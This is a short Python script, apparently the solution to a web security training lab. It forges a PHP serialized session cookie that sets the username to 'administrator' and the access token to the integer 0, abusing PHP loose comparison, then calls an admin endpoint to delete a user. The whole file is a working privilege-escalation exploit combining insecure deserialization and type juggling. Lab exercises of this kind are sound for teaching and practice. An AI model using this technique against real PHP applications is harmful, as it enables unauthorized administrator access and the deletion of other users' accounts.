import sys
import os
import base64
sys.path.insert(0, os.path.join(os.path.dirname(__file__), "../.."))
from utils.base import LabSession

lab = LabSession()

lab.login("wiener", "peter")

cookie = lab.session.cookies.get("session")
raw = base64.b64decode(cookie).decode()
lab.info(f"Original: {raw}")

# change username to administrator and access_token from string to integer 0
# PHP loose comparison: 0 == "any_string_not_starting_with_number" is true
# so i:0 will match the real access token
modified = 'O:4:"User":2:{s:8:"username";s:13:"administrator";s:12:"access_token";i:0;}'
lab.info(f"Modified: {modified}")

new_cookie = base64.b64encode(modified.encode()).decode()
lab.session.cookies.set("session", new_cookie)

resp = lab.get("/admin/delete?username=carlos")

lab.check_solved()
